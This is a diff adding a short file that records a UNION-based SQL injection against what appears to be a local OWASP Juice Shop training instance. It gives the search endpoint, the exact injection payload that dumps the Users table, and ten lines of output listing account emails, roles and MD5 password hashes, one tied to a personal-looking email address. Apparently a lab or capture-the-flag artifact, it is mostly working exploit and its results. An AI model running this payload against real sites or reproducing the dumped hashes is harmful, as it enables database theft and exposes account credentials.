@@ -1,0 +1,15 @@
+# c05-sqli-union-dump - full Users table via UNION-based SQLi
+# target  : GET http://host.docker.internal:3000/rest/products/search?q=
+# backend : SQLite (Sequelize) - 10 columns
+# payload : qwerty')) UNION SELECT id, username, email, password, role, deluxeToken, 7, profileImage, totpSecret, isActive FROM Users--
+# format  : email<TAB>role<TAB>password_hash
+admin@juice-sh.op	admin	0192023a7bbd73250516f069df18b500
+jim@juice-sh.op	customer	e541ca7ecf72b8d1286474fc613e5e45
+bender@juice-sh.op	customer	0c36e517e3fa95aabf1bbffc6744a4ef
+bjoern.kimminich@gmail.com	admin	6edd9d726cbdc873c539e41ae8757b8c
+ciso@juice-sh.op	deluxe	861917d5fa5f1172f931dc700d81a8fb
+support@juice-sh.op	admin	3869433d74e3d0c86fd25562f836bc82
+morty@juice-sh.op	customer	f2f933d0bb0ba057bc8e33b8ebd6d9e8
+mc.safesearch@juice-sh.op	customer	b03f4b0ba8b458fa0acdc02cdb953bc8
+J12934@juice-sh.op	admin	3c2abc04e4a6ea8f1327d0aae3714b7d
+wurstbrot@juice-sh.op	admin	9ad5b0492bbe528583e128d2a8941de4
